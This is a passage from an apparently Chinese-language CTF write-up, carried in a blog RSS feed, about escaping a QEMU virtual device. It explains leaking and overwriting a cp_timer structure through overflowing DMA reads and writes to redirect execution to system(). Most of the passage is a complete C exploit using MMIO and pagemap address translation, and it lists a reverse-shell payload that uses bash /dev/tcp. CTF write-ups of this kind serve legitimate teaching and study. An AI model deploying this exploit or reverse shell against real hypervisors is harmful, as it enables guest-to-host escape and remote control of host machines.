<a class="sourceLine" id="cb13-63" title="63">    <span class="cf">if</span> (mmio_mem == MAP_FAILED){</a>
<a class="sourceLine" id="cb13-64" title="64">        perror(<span class="st">&quot;mmap mmio&quot;</span>);</a>
<a class="sourceLine" id="cb13-65" title="65">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-66" title="66">    }</a>
<a class="sourceLine" id="cb13-67" title="67"></a>
<a class="sourceLine" id="cb13-68" title="68">    printf(<span class="st">&quot;mmio_mem:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>, mmio_mem);</a>
<a class="sourceLine" id="cb13-69" title="69"></a>
<a class="sourceLine" id="cb13-70" title="70">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb13-71" title="71">    <span class="cf">if</span> (userbuf == MAP_FAILED){</a>
<a class="sourceLine" id="cb13-72" title="72">        perror(<span class="st">&quot;mmap userbuf&quot;</span>);</a>
<a class="sourceLine" id="cb13-73" title="73">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-74" title="74">    }</a>
<a class="sourceLine" id="cb13-75" title="75"></a>
<a class="sourceLine" id="cb13-76" title="76">    strcpy(userbuf,<span class="st">&quot;test&quot;</span>);</a>
<a class="sourceLine" id="cb13-77" title="77"></a>
<a class="sourceLine" id="cb13-78" title="78">    mlock(userbuf, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb13-79" title="79">    userbuf_pa = va2pa(userbuf);</a>
<a class="sourceLine" id="cb13-80" title="80"></a>
<a class="sourceLine" id="cb13-81" title="81">    printf(<span class="st">&quot;userbuf_va:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,userbuf);</a>
<a class="sourceLine" id="cb13-82" title="82">    printf(<span class="st">&quot;userbuf_pa:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,(<span class="dt">void</span> *)userbuf_pa);</a>
<a class="sourceLine" id="cb13-83" title="83">}</a></code></pre></div>
<h3 id="漏洞利用-1">3. 漏洞利用</h3>
<ul>
<li>通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system@plt 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。</li>
<li>通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流</li>
</ul>
<p>触发时钟可以利用两种方式：</p>
<ul>
<li>虚拟机重启或关机的时候会触发时钟，调用 cb(opaque)</li>
<li>在 MMOI WRITE 中可以触发时钟</li>
</ul>
<p>system 执行内容：</p>
<ul>
<li>cat /flag</li>
<li>反弹 shell，/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。</li>
<li>弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。</li>
</ul>
<p>注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000 的物理地址复制），需要额外的注意。</p>
<h3 id="exploit-1">4. Exploit</h3>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb14-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb14-2" title="2"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb14-3" title="3"><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb14-4" title="4"><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb14-5" title="5"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb14-6" title="6"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb14-7" title="7"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb14-8" title="8"><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></a>
<a class="sourceLine" id="cb14-9" title="9"></a>
<a class="sourceLine" id="cb14-10" title="10"><span class="pp">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span></a>
<a class="sourceLine" id="cb14-11" title="11"><span class="pp">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span></a>
<a class="sourceLine" id="cb14-12" title="12"></a>
<a class="sourceLine" id="cb14-13" title="13"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb14-14" title="14"><span class="dt">uint64_t</span> phy_userbuf;</a>
<a class="sourceLine" id="cb14-15" title="15"><span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb14-16" title="16"><span class="dt">uint64_t</span> phy_userbuf1;</a>
<a class="sourceLine" id="cb14-17" title="17"><span class="dt">uint64_t</span> phy_buf0;</a>
<a class="sourceLine" id="cb14-18" title="18"><span class="dt">char</span> *userbuf1;</a>
<a class="sourceLine" id="cb14-19" title="19"><span class="dt">int</span> fd;</a>
<a class="sourceLine" id="cb14-20" title="20"><span class="dt">void</span> Err(<span class="dt">char</span>* err){</a>
<a class="sourceLine" id="cb14-21" title="21">    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>, err);</a>
<a class="sourceLine" id="cb14-22" title="22">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-23" title="23">}</a>
<a class="sourceLine" id="cb14-24" title="24"></a>
<a class="sourceLine" id="cb14-25" title="25"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb14-26" title="26">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</a>
<a class="sourceLine" id="cb14-27" title="27">    <span class="cf">if</span>(mmio_fd &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-28" title="28">        Err(<span class="st">&quot;Open pci&quot;</span>);</a>
<a class="sourceLine" id="cb14-29" title="29">    }</a>
<a class="sourceLine" id="cb14-30" title="30">    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-31" title="31">    <span class="cf">if</span>(mmio_mem&lt;<span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-32" title="32">        Err(<span class="st">&quot;mmap mmio_mem&quot;</span>);</a>
<a class="sourceLine" id="cb14-33" title="33">    }</a>
<a class="sourceLine" id="cb14-34" title="34">}</a>
<a class="sourceLine" id="cb14-35" title="35"></a>
<a class="sourceLine" id="cb14-36" title="36"><span class="dt">void</span> mmio_write(<span class="dt">uint64_t</span> addr, <span class="dt">uint64_t</span> value){</a>
<a class="sourceLine" id="cb14-37" title="37">    *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)) = value;</a>
<a class="sourceLine" id="cb14-38" title="38">}</a>
<a class="sourceLine" id="cb14-39" title="39"></a>
<a class="sourceLine" id="cb14-40" title="40"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb14-41" title="41">    <span class="cf">return</span> *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)); </a>
<a class="sourceLine" id="cb14-42" title="42">}</a>
<a class="sourceLine" id="cb14-43" title="43"></a>
<a class="sourceLine" id="cb14-44" title="44"><span class="dt">void</span> set_list_cnt(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-45" title="45">    mmio_write(<span class="bn">0x10</span>, cnt);</a>
<a class="sourceLine" id="cb14-46" title="46">}</a>
<a class="sourceLine" id="cb14-47" title="47"></a>
<a class="sourceLine" id="cb14-48" title="48"><span class="dt">void</span> set_src(<span class="dt">uint64_t</span> src){</a>
<a class="sourceLine" id="cb14-49" title="49">    mmio_write(<span class="bn">0x8</span>, src);</a>
<a class="sourceLine" id="cb14-50" title="50">}</a>
<a class="sourceLine" id="cb14-51" title="51"></a>
<a class="sourceLine" id="cb14-52" title="52"><span class="dt">void</span> set_cmd(<span class="dt">uint64_t</span> cmd){</a>
<a class="sourceLine" id="cb14-53" title="53">    mmio_write(<span class="bn">0x18</span>, cmd);</a>
<a class="sourceLine" id="cb14-54" title="54">}</a>
<a class="sourceLine" id="cb14-55" title="55"></a>
<a class="sourceLine" id="cb14-56" title="56"><span class="dt">void</span> set_read(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-57" title="57">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-58" title="58">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-59" title="59"></a>
<a class="sourceLine" id="cb14-60" title="60">    set_cmd(<span class="bn">0x4</span>);</a>
<a class="sourceLine" id="cb14-61" title="61">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-62" title="62">}</a>
<a class="sourceLine" id="cb14-63" title="63"></a>
<a class="sourceLine" id="cb14-64" title="64"><span class="dt">void</span> set_write(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-65" title="65">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-66" title="66">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-67" title="67"></a>
<a class="sourceLine" id="cb14-68" title="68">    set_cmd(<span class="bn">0x2</span>);</a>
<a class="sourceLine" id="cb14-69" title="69">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-70" title="70">}</a>
<a class="sourceLine" id="cb14-71" title="71"></a>
<a class="sourceLine" id="cb14-72" title="72"><span class="dt">void</span> set_read_write(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-73" title="73">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-74" title="74">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-75" title="75"></a>
<a class="sourceLine" id="cb14-76" title="76">    set_cmd(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-77" title="77">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-78" title="78">}</a>
<a class="sourceLine" id="cb14-79" title="79"></a>
<a class="sourceLine" id="cb14-80" title="80"><span class="pp">#define PAGE_SHIFT 12</span></a>
<a class="sourceLine" id="cb14-81" title="81"><span class="pp">#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></a>
<a class="sourceLine" id="cb14-82" title="82"><span class="pp">#define PFN_PRESENT (1ull &lt;&lt; 63)</span></a>
<a class="sourceLine" id="cb14-83" title="83"><span class="pp">#define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></a>
<a class="sourceLine" id="cb14-84" title="84"><span class="dt">int</span> fd;</a>
<a class="sourceLine" id="cb14-85" title="85"><span class="dt">uint32_t</span> page_offset(<span class="dt">uint32_t</span> addr)</a>
<a class="sourceLine" id="cb14-86" title="86">{</a>
<a class="sourceLine" id="cb14-87" title="87">    <span class="cf">return</span> addr &amp; ((<span class="dv">1</span> &lt;&lt; PAGE_SHIFT) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-88" title="88">}</a>
<a class="sourceLine" id="cb14-89" title="89"></a>
<a class="sourceLine" id="cb14-90" title="90"><span class="dt">uint64_t</span> gva_to_gfn(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb14-91" title="91">{</a>
<a class="sourceLine" id="cb14-92" title="92">    <span class="dt">uint64_t</span> pme, gfn;</a>
<a class="sourceLine" id="cb14-93" title="93">    <span class="dt">size_t</span> offset;</a>
<a class="sourceLine" id="cb14-94" title="94">    offset = ((<span class="dt">uintptr_t</span>)addr &gt;&gt; <span class="dv">9</span>) &amp; ~<span class="dv">7</span>;</a>
<a class="sourceLine" id="cb14-95" title="95">    <span class="co">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></a>
<a class="sourceLine" id="cb14-96" title="96">    lseek(fd, offset, SEEK_SET);</a>
<a class="sourceLine" id="cb14-97" title="97">    read(fd, &amp;pme, <span class="dv">8</span>);</a>
<a class="sourceLine" id="cb14-98" title="98">    <span class="cf">if</span> (!(pme &amp; PFN_PRESENT))</a>
<a class="sourceLine" id="cb14-99" title="99">        <span class="cf">return</span> -<span class="dv">1</span>;</a>
<a class="sourceLine" id="cb14-100" title="100">    gfn = pme &amp; PFN_PFN;</a>
<a class="sourceLine" id="cb14-101" title="101">    <span class="cf">return</span> gfn;</a>
<a class="sourceLine" id="cb14-102" title="102">}</a>
<a class="sourceLine" id="cb14-103" title="103"></a>
<a class="sourceLine" id="cb14-104" title="104"><span class="co">/*</span></a>
<a class="sourceLine" id="cb14-105" title="105"><span class="co">* transfer visual address to physic address</span></a>
<a class="sourceLine" id="cb14-106" title="106"><span class="co">*/</span></a>
<a class="sourceLine" id="cb14-107" title="107"><span class="dt">uint64_t</span> gva_to_gpa(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb14-108" title="108">{</a>
<a class="sourceLine" id="cb14-109" title="109">    <span class="dt">uint64_t</span> gfn = gva_to_gfn(addr);</a>
<a class="sourceLine" id="cb14-110" title="110">    <span class="cf">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="dt">uint64_t</span>)addr);</a>
<a class="sourceLine" id="cb14-111" title="111">}</a>
<a class="sourceLine" id="cb14-112" title="112"></a>
<a class="sourceLine" id="cb14-113" title="113"></a>
<a class="sourceLine" id="cb14-114" title="114"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb14-115" title="115">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb14-116" title="116"></a>
<a class="sourceLine" id="cb14-117" title="117">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb14-118" title="118">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb14-119" title="119"></a>
<a class="sourceLine" id="cb14-120" title="120">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-121" title="121">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb14-122" title="122">        close(fd);</a>
<a class="sourceLine" id="cb14-123" title="123">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-124" title="124">    }</a>
<a class="sourceLine" id="cb14-125" title="125"></a>
<a class="sourceLine" id="cb14-126" title="126">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb14-127" title="127">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb14-128" title="128">        close(fd);</a>
<a class="sourceLine" id="cb14-129" title="129">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-130" title="130">    }</a>
<a class="sourceLine" id="cb14-131" title="131"></a>
<a class="sourceLine" id="cb14-132" title="132">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb14-133" title="133">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb14-134" title="134">        close(fd);</a>
<a class="sourceLine" id="cb14-135" title="135">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-136" title="136">    }</a>
<a class="sourceLine" id="cb14-137" title="137"></a>
<a class="sourceLine" id="cb14-138" title="138">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-139" title="139">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb14-140" title="140"></a>
<a class="sourceLine" id="cb14-141" title="141">    close(fd);</a>
<a class="sourceLine" id="cb14-142" title="142"></a>
<a class="sourceLine" id="cb14-143" title="143">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb14-144" title="144">}</a>
<a class="sourceLine" id="cb14-145" title="145"></a>
<a class="sourceLine" id="cb14-146" title="146"><span class="dt">void</span> print_hex(<span class="dt">uint64_t</span> len, <span class="dt">uint64_t</span> offset){</a>
<a class="sourceLine" id="cb14-147" title="147">    printf(<span class="st">&quot;===========================</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-148" title="148">    <span class="cf">for</span>(<span class="dt">int</span> i = <span class="dv">0</span>; i&lt;len/<span class="dv">8</span>; i++){</a>
<a class="sourceLine" id="cb14-149" title="149">        printf(<span class="st">&quot;    0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, *(<span class="dt">uint64_t</span>*)(userbuf1+offset+i*<span class="dv">8</span>));</a>
<a class="sourceLine" id="cb14-150" title="150">    }</a>
<a class="sourceLine" id="cb14-151" title="151">}</a>
<a class="sourceLine" id="cb14-152" title="152"></a>
<a class="sourceLine" id="cb14-153" title="153"><span class="dt">size_t</span> buf0, buf1;</a>
<a class="sourceLine" id="cb14-154" title="154"></a>
<a class="sourceLine" id="cb14-155" title="155"><span class="dt">void</span> get_pages()</a>
<a class="sourceLine" id="cb14-156" title="156">{</a>
<a class="sourceLine" id="cb14-157" title="157">    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb14-158" title="158">    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb14-159" title="159">    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-160" title="160">    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb14-161" title="161">    <span class="dt">int</span> n = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-162" title="162">    buf[n] = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb14-163" title="163">    arry[n++] = arr;</a>
<a class="sourceLine" id="cb14-164" title="164">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</a>
<a class="sourceLine" id="cb14-165" title="165">    {</a>
<a class="sourceLine" id="cb14-166" title="166">        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-167" title="167">        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb14-168" title="168">        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb14-169" title="169">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</a>
<a class="sourceLine" id="cb14-170" title="170">        {</a>
<a class="sourceLine" id="cb14-171" title="171">            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</a>
<a class="sourceLine" id="cb14-172" title="172">            {</a>
<a class="sourceLine" id="cb14-173" title="173">                LOG(<span class="st">&quot;consist pages&quot;</span>);</a>
<a class="sourceLine" id="cb14-174" title="174">                HEX(arr);</a>
<a class="sourceLine" id="cb14-175" title="175">                HEX(fn);</a>
<a class="sourceLine" id="cb14-176" title="176">                HEX(arry[j]);</a>
<a class="sourceLine" id="cb14-177" title="177">                HEX(buf[j]);</a>
<a class="sourceLine" id="cb14-178" title="178">                <span class="cf">if</span> (fn &gt; buf[j])</a>
<a class="sourceLine" id="cb14-179" title="179">                {</a>
<a class="sourceLine" id="cb14-180" title="180">                    buf0 = arry[j];</a>
<a class="sourceLine" id="cb14-181" title="181">                    buf1 = arr;</a>
<a class="sourceLine" id="cb14-182" title="182">                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb14-183" title="183">                }</a>
<a class="sourceLine" id="cb14-184" title="184">                <span class="cf">else</span></a>
<a class="sourceLine" id="cb14-185" title="185">                {</a>
<a class="sourceLine" id="cb14-186" title="186">                    buf1 = arry[j];</a>
<a class="sourceLine" id="cb14-187" title="187">                    buf0 = arr;</a>
<a class="sourceLine" id="cb14-188" title="188">                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb14-189" title="189">                }</a>
<a class="sourceLine" id="cb14-190" title="190">                <span class="cf">return</span>;</a>
<a class="sourceLine" id="cb14-191" title="191">            }</a>
<a class="sourceLine" id="cb14-192" title="192">        }</a>
<a class="sourceLine" id="cb14-193" title="193">        buf[n] = fn;</a>
<a class="sourceLine" id="cb14-194" title="194">        arry[n++] = arr;</a>
<a class="sourceLine" id="cb14-195" title="195">    }</a>
<a class="sourceLine" id="cb14-196" title="196">}</a>
<a class="sourceLine" id="cb14-197" title="197"></a>
<a class="sourceLine" id="cb14-198" title="198"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb14-199" title="199"></a>
<a class="sourceLine" id="cb14-200" title="200">    fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb14-201" title="201">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb14-202" title="202">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb14-203" title="203">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-204" title="204">    }</a>
<a class="sourceLine" id="cb14-205" title="205">    get_pages();</a>
<a class="sourceLine" id="cb14-206" title="206"></a>
<a class="sourceLine" id="cb14-207" title="207">    printf(<span class="st">&quot;init mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-208" title="208">    init_mmio();</a>
<a class="sourceLine" id="cb14-209" title="209"></a>
<a class="sourceLine" id="cb14-210" title="210">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-211" title="211">    <span class="cf">if</span> (userbuf == MAP_FAILED)</a>
<a class="sourceLine" id="cb14-212" title="212">        Err(<span class="st">&quot;mmap userbuf&quot;</span>);</a>
<a class="sourceLine" id="cb14-213" title="213">    mlock(userbuf, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-214" title="214">    phy_userbuf = va2pa(userbuf);</a>
<a class="sourceLine" id="cb14-215" title="215">    printf(<span class="st">&quot;userbuf va: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, userbuf);</a>
<a class="sourceLine" id="cb14-216" title="216">    printf(<span class="st">&quot;userbuf pa: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_userbuf);</a>
<a class="sourceLine" id="cb14-217" title="217"></a>
<a class="sourceLine" id="cb14-218" title="218">    memset(buf0, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-219" title="219">    memset(buf1, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-220" title="220">    printf(<span class="st">&quot;[++++] 0x%lx %p</span><span class="sc">\n</span><span class="st">&quot;</span>, buf0, buf0);</a>
<a class="sourceLine" id="cb14-221" title="221">    printf(<span class="st">&quot;phy_buf0: 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_buf0);</a>
<a class="sourceLine" id="cb14-222" title="222"></a>
<a class="sourceLine" id="cb14-223" title="223">    printf(<span class="st">&quot;leak addr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-224" title="224">    *(<span class="dt">uint64_t</span>*)(userbuf) = phy_userbuf;</a>
<a class="sourceLine" id="cb14-225" title="225">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>) = <span class="bn">0x1000</span>;</a>
<a class="sourceLine" id="cb14-226" title="226">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-227" title="227">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0xff8</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-228" title="228">    set_write(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-229" title="229">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-230" title="230">    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</a>
<a class="sourceLine" id="cb14-231" title="231">        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_userbuf;</a>
<a class="sourceLine" id="cb14-232" title="232">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1040</span>;</a>
<a class="sourceLine" id="cb14-233" title="233">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-234" title="234">    }</a>
<a class="sourceLine" id="cb14-235" title="235">    set_read(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-236" title="236">    <span class="co">//sleep(3);</span></a>
<a class="sourceLine" id="cb14-237" title="237"></a>
<a class="sourceLine" id="cb14-238" title="238">    <span class="dt">size_t</span> buf_addr = *(<span class="dt">size_t</span>*)(buf1+<span class="bn">0x18</span>)+<span class="bn">0xa00</span>;</a>
<a class="sourceLine" id="cb14-239" title="239">    <span class="dt">size_t</span> t_addr = *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>);</a>
<a class="sourceLine" id="cb14-240" title="240">    printf(<span class="st">&quot;timer_addr: 0x%llx 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, buf_addr, t_addr);</a>
<a class="sourceLine" id="cb14-241" title="241">    <span class="dt">size_t</span> system_plt = t_addr - <span class="bn">0x4dce80</span> + <span class="bn">0x2c2180</span>;</a>
<a class="sourceLine" id="cb14-242" title="242">    printf(<span class="st">&quot;system_plt: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_plt);</a>
<a class="sourceLine" id="cb14-243" title="243"></a>
<a class="sourceLine" id="cb14-244" title="244">    printf(<span class="st">&quot;write ptr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-245" title="245">    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</a>
<a class="sourceLine" id="cb14-246" title="246">        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-247" title="247">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1020</span>;</a>
<a class="sourceLine" id="cb14-248" title="248">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-249" title="249">    }</a>
<a class="sourceLine" id="cb14-250" title="250">    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>) = system_plt;</a>
<a class="sourceLine" id="cb14-251" title="251">    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x18</span>) = buf_addr;</a>
<a class="sourceLine" id="cb14-252" title="252">    <span class="dt">char</span> *command=<span class="st">&quot;cat ./flag</span><span class="sc">\x00</span><span class="st">&quot;</span>;</a>
<a class="sourceLine" id="cb14-253" title="253">    memcpy(buf0,command,strlen(command));</a>
<a class="sourceLine" id="cb14-254" title="254">    printf(<span class="st">&quot;cover system addr</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-255" title="255">    set_read_write(<span class="bn">0x11</span>);</a>
<a class="sourceLine" id="cb14-256" title="256">    printf(<span class="st">&quot;trigger vul</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-257" title="257">    set_read(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-258" title="258">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-259" title="259">}</a></code></pre></div>]]></description>
    <pubDate>Tue, 8 Nov 2022 17:20:42 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Mark's blog]]></title>
    <link>https://blog.mark0519.com/#//#/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/README</guid>
